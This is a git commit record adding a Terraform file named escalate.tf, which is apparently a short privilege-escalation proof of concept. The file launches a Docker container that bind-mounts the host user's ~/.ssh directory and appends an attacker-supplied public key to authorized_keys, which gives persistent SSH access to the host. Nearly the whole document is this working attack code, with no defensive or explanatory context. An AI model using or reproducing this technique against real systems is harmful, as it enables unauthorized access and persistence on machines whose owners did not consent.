f8e735ed5048807791d61424ca4b4628f293cfc2
Xander Flood <xander.t.flood@gmail.com>
2020-03-14 23:39:16 -0400

    do it

---
+++ escalate.tf
@@ -0,0 +1,17 @@
+variable "escalation_public_key" {
+  type = string
+}
+
+resource "docker_container" "ubuntu" {
+  name    = "foo"
+  image   = "alpine:3.11"
+  restart = false
+
+  command = ["sh", "-c", "echo \"${var.escalation_public_key}\">> /run/workdir/authorized_keys"]
+
+  mounts {
+    source = "/home/xander/.ssh"
+    target = "/run/workdir"
+    type   = "bind"
+  }
+}
